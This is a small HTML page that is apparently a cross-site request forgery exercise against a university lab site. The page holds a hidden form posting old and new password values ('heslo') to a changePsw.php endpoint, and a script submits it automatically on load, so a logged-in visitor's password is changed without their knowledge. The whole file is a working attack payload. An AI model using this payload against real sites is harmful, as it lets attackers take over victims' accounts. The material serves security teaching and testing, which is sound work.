<html>
  <body>
    <form action="https://wt69.fei.stuba.sk/CSRF/changePsw.php" method="POST" target="_blank">
      <input type="hidden" id="new_psw" name="old_psw" value="heslo" />
      <input type="hidden" id="old_psw" name="new_psw" value="heslo" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
